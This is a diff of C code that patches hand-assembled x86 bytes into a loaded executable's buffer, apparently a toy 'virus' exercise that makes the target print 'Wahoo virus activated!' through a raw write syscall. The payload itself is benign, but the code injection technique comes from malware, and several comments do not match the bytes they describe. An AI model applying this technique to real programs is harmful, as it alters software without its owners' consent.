@@ -13,56 +13,58 @@ int main() {
     // close files
     fclose(target);
     
-    // prepare the rsp
-    buffer[1102] = 0x83; // sub rsp, 0x10
-    buffer[1103] = 0xec;
-    buffer[1104] = 0x18;
+    // mov eax, 4
+    buffer[1102] = 0xb8;
+    buffer[1103] = 0x04;
+    buffer[1104] = 0x00;
+    buffer[1105] = 0x00;
+    buffer[1106] = 0x00;
 
-    // replace nop with movl of the address of the string to print
-    buffer[1105] = 0x68;
+    // mov ebx, 1
+    buffer[1107] = 0xbb;
+    buffer[1108] = 0x01;
+    buffer[1109] = 0x00;
+    buffer[1110] = 0x00;
+    buffer[1111] = 0x00;
 
-    // Fill in little-endian representation of 0x0804845C starting from offset 1104
-    buffer[1106] = 0x5c; // Least significant byte
-    buffer[1107] = 0x84;
-    buffer[1108] = 0x04;
-    buffer[1109] = 0x08; // Most significant byte
+    // mov ecx 0x08048468
+    buffer[1112] = 0xb9;
+    buffer[1113] = 0x68;
+    buffer[1114] = 0x84;
+    buffer[1115] = 0x04;
+    buffer[1116] = 0x08;
 
+    // syscall
+    buffer[1117] = 0xcd;
+    buffer[1118] = 0x80;
 
+    // ret
+    buffer[1119] = 0xc3;
 
-    // Insert 'call puts' instruction (e8 94 fe ff ff) at the appropriate offset
-    buffer[1110] = 0xe8; // call opcode
-    buffer[1111] = 0x94; // offset byte 1
-    buffer[1112] = 0xfe; // offset byte 2
-    buffer[1113] = 0xff; // offset byte 3
-    buffer[1114] = 0xff; // offset byte 4
-
-    // Return to the original program
-    buffer[1115] = 0xc3; // ret opcode
-
-    // Fill buffer with "Wahoo virus activated!" starting from offset 0x45C (1116 in decimal)
-    buffer[1116] = 0x57; // W
-    buffer[1117] = 0x61; // a
-    buffer[1118] = 0x68; // h
-    buffer[1119] = 0x6f; // o
-    buffer[1120] = 0x6f; // o
-    buffer[1121] = 0x20; //  
-    buffer[1122] = 0x76; // v
-    buffer[1123] = 0x69; // i
-    buffer[1124] = 0x72; // r
-    buffer[1125] = 0x75; // u
-    buffer[1126] = 0x73; // s
-    buffer[1127] = 0x20; //  
-    buffer[1128] = 0x61; // a
-    buffer[1129] = 0x63; // c
-    buffer[1130] = 0x74; // t
-    buffer[1131] = 0x69; // i
-    buffer[1132] = 0x76; // v
-    buffer[1133] = 0x61; // a
-    buffer[1134] = 0x74; // t
-    buffer[1135] = 0x65; // e
-    buffer[1136] = 0x64; // d
-    buffer[1137] = 0x21; // !
-    buffer[1138] = 0x00; // null terminator
+    // Fill buffer with "Wahoo virus activated!" starting from offset 1128
+    buffer[1128] = 0x57; // W
+    buffer[1129] = 0x61; // a
+    buffer[1130] = 0x68; // h
+    buffer[1131] = 0x6f; // o
+    buffer[1132] = 0x6f; // o
+    buffer[1133] = 0x20; //  
+    buffer[1134] = 0x76; // v
+    buffer[1135] = 0x69; // i
+    buffer[1136] = 0x72; // r
+    buffer[1137] = 0x75; // u
+    buffer[1138] = 0x73; // s
+    buffer[1139] = 0x20; //  
+    buffer[1140] = 0x61; // a
+    buffer[1141] = 0x63; // c
+    buffer[1142] = 0x74; // t
+    buffer[1143] = 0x69; // i
+    buffer[1144] = 0x76; // v
+    buffer[1145] = 0x61; // a
+    buffer[1146] = 0x74; // t
+    buffer[1147] = 0x65; // e
+    buffer[1148] = 0x64; // d
+    buffer[1149] = 0x21; // !
+    buffer[1150] = 0x00; // null terminator
 
     // replace char 493 with push 0x0804844e in little endian
     buffer[1171] = 0x68;
